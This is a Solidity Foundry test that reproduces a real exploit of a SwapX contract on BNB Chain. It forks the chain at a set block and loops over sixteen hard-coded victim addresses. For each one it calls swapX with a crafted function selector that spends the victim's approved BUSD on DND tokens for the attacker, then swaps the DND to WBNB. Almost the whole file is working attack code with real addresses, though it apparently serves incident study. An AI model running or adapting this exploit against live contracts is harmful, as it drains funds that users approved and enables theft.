// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1630111965942018049
// https://twitter.com/peckshield/status/1630100506319413250
// @TX
// https://bscscan.com/tx/0x3ee23c1585474eaa4f976313cafbc09461abb781d263547c8397788c68a00160

contract ContractTest is Test {
    address swapX = 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01;
    IERC20 DND = IERC20(0x34EA3F7162E6f6Ed16bD171267eC180fD5c848da);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);
    address[] victims = [
        0x0b70e2Abe6F1A056E23658aED1FF9EF9901CB2A3,
        0x210C9E1d9E0572da30B2b8b9ca57E5e380528534,
        0x6906f738daFD4Bf14d6e3e979d4Aaf980FF5392D,
        0x708a34D4C5a7D7fd39eE4DB0593be18df58fd227,
        0x48ba64b8CBd8BBcE086E8e8ECc6f4De34AA35D08,
        0xBF57dea8e19022562F002Da6b7bbe2A2DB85c2c0,
        0x4148b0B927cC8246f65AF9B77dfA84b60565820c,
        0x57070188BAA313c73fffDbA43c0ABE17fbFB41f9,
        0x08943873222CE63eC48f8907757928dcb06af388,
        0x047252B87FB7ecb7e29F8026dd117EB8B8E6cF0f,
        0x8C51b7BB3f64845912616914455517DF294A0d0B,
        0x91243b8242f13299C5af661ef5d19bfE0D3bf024,
        0xfe23ea0CEC98D54A677F4aD3082D64f8A0207eB7,
        0x54D7AFCaF140fA45Ff5387f0f2954bC913c0796F,
        0x76bf18aFED5AcCFd59525D10ce15C4B8Cb64370d,
        0xe5d985b7b934dc0e0E1043Fc11f50ba9E229465C
    ];

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_023_088);
        cheats.label(address(swapX), "swapX");
        cheats.label(address(DND), "DND");
        cheats.label(address(BUSD), "BUSD");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(Router), "Router");
    }

    function testExploit() external {
        deal(address(DND), address(this), 1_000_000 * 1e18);
        for (uint256 i; i < victims.length; ++i) {
            uint256 transferAmount = BUSD.balanceOf(victims[i]);
            if (BUSD.allowance(victims[i], swapX) < transferAmount) {
                transferAmount = BUSD.allowance(victims[i], swapX);
                if (transferAmount == 0) continue;
            }
            address[] memory swapPath = new address[](3);
            swapPath[0] = address(BUSD);
            swapPath[1] = address(WBNB);
            swapPath[2] = address(DND);
            uint256 value = 0;
            uint24[] memory array = new uint24[](16);
            array[0] = 65_536;
            array[11] = 257;
            swapX.call(abi.encodeWithSelector(0x4f1f05bc, swapPath, transferAmount, value, array, victims[i]));
        }

        DNDToWBNB();

        emit log_named_decimal_uint(
            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function DNDToWBNB() internal {
        DND.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(DND);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokens(DND.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }
}
